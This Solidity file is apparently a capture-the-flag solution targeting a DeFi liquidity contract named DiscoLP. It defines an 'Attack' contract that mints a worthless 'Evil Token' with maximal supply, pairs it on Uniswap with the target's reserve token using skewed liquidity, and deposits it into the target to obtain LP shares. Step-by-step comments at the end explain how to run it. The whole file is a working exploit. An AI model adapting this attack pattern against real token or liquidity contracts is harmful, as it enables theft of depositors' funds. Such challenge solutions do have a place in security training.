import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IUniswapV2Factory {
  event PairCreated(address indexed token0, address indexed token1, address pair, uint);

  function getPair(address tokenA, address tokenB) external view returns (address pair);
  function allPairs(uint) external view returns (address pair);
  function allPairsLength() external view returns (uint);

  function feeTo() external view returns (address);
  function feeToSetter() external view returns (address);

  function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router {
	function WETH() external pure returns (address _token);
	function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);
	function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);
	function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);
	function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);
	function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);
}

interface Pair
{
	function token0() external view returns (address _token0);
	function token1() external view returns (address _token1);
	function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);
	function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);
	function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
	function mint(address _to) external returns (uint256 _liquidity);
	function sync() external;
}

interface DiscoLP is IERC20 {
    function depositToken(address _token, uint256 _amount, uint256 _minShares) external;
    function calcCostFromShares(uint256 _shares) external view returns (uint256);
    function totalReserve() external view returns (uint256);
}

library $
{
	address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten
	address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten
}

contract Token is ERC20 {
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public {
        _mint(msg.sender, 2**256 - 1);
    }
}

contract Attack {
    uint256 public balance;
    function attack (address instance, uint256 amount, address tokenA) public {
        address _factory = $.UniswapV2_FACTORY;
        address _router = $.UniswapV2_ROUTER02;
        Token evil = new Token("Evil Token", "EVIL");
        evil.approve(instance, 2**256 - 1);
        evil.approve(_router, 2**256 - 1);
        IERC20(tokenA).approve(_router, 2**256 - 1);
        address pair = IUniswapV2Factory(_factory).createPair(address(evil), address(tokenA));
        (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(
          address(evil),
          address(tokenA),
          100000000000 * 10 ** 18,
          1 * 10 ** 18,
          1, 1, address(this), 2**256 - 1);
        DiscoLP(instance).depositToken(address(evil), amount, 1);
        balance = DiscoLP(instance).balanceOf(address(this));
    }
}

/**
 * step 1: get reserveToken() on instance
 * step 2: get token0 on Pair(reserveToken)
 * step 3: deploy attack contract
 * step 4: token0.transfer(attack contract, 1 * 10 ** 18)
 * step 5: attack(instance, 50000 * 10 ** 18, token0)
 */
